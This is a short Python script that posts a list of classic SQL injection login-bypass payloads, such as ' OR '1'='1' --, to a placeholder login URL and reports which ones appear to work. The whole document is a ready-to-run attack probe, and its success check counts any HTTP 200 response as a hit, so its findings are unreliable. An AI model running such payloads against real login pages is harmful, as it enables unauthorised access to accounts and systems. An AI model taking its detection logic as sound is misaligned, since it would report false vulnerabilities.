import requests

# URL of the web application's login endpoint
url = 'http://example.com/login'

# List of payloads to test for SQL injection
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "' OR 'a'='a",
    "' OR 'a'='a' --",
    "' OR 1=1 #",
    "' OR '1'='1' /*"
]


def test_sql_injection(url, payloads):
    for payload in payloads:
        data = {
            'username': payload,
            'password': 'password'
        }
        response = requests.post(url, data=data)
        if "Welcome" in response.text or response.status_code == 200:
            print(f"Potential SQL Injection vulnerability detected with payload: {payload}")
        else:
            print(f"Payload {payload} did not succeed.")


# Run the test
test_sql_injection(url, payloads)
